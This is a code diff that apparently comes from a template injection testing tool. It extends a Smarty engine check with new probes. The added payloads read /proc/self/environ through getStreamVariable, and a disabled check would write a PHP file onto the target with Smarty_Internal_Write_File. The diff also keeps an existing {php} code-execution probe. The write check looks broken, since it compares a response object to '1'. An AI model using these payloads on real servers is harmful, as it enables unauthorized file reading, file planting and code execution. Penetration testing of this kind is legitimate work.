@@ -2,6 +2,9 @@ from core.check import Check
 from utils.loggers import log
 import random
 import string
+import requests
+import urlparse
+import os
 
 class Smarty(Check):
     
@@ -27,15 +30,19 @@ class Smarty(Check):
         
         self._check_os()
         
-        if not self.state.get('exec'):
-            return
-            
-        log.warn(
-            'Shell command execution detected on \'%s\' operating system' % (
-                self.state.get('os', 'undetected')
+        if self.state.get('exec'):
+            log.warn(
+                'Shell command execution detected on \'%s\' operating system' % (
+                    self.state.get('os', 'undetected')
+                )
             )
-        )
-
+            
+        self._check_read()
+        if self.state.get('read'):
+            log.warn('Can ready arbitrary file')
+            
+        self._check_write()
+            
     def _check_engine(self):
         
         randA = ''.join(random.choice(string.letters + string.digits) for _ in range(2))
@@ -75,4 +82,30 @@ class Smarty(Check):
     
             payload = """{php}echo PHP_OS;{/php}"""
             self.state['os'] = self.req(payload)    
+    
+    def _check_read(self):
+        
+        payload = """{self::getStreamVariable("file:///proc/self/environ")}"""
+        result_proc_self_environ = self.req(payload)
+        
+        if 'PATH=' in result_proc_self_environ:
+            self.state['read'] = True
+            
+    def _check_write(self):
+        
+        return
+        
+        rand_filename = ''.join(random.choice(string.letters) for _ in range(5)) + '.php'
+
+        payload = """{Smarty_Internal_Write_File::writeFile("%s","1",self::clearConfig())}""" % rand_filename
+        url_path = urlparse.urlparse(self.channel.url).path
+        url_folder, url_file = os.path.split(url_path)
+        
+        url = self.channel.url.replace(url_file, rand_filename)
+        
+        print requests.get(url) == '1', url, requests.get(url)
+        
+        if requests.get(url) == '1':
+            self.state['write'] = True
+        
         
